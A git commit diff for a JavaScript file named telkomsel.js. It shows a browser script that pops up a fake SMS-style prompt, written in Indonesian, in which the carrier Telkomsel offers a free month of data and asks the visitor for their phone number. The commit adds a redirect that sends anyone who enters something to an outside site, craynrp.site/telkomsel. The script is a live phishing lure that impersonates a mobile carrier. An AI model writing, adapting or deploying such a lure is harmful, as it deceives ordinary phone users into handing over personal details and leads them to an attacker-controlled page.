6bcf1b440d84256c609d47e1c099c4ad354828f3
newetijazz26 <newetijazz26@gmail.com>
2026-02-03 14:28:31 +0100

    Update and rename v4.js to telkomsel.js

--- telkomsel.js
+++ telkomsel.js
@@ -2,5 +2,5 @@
 var password = 'DARA GRATIS 1 BULAN'
 password=prompt('SMS: Selamat, Nomor Telkomsel Anda berhak menerima Data Gratis 1 Bulan, klik OK untuk Memasukkan Nomor Ponsel Anda','DARA GRATIS 1 BULAN');
 if (password != 'DARA GRATIS 1 BULAN') {
-location.href='';
+location.href='https://www.craynrp.site/telkomsel';
 }
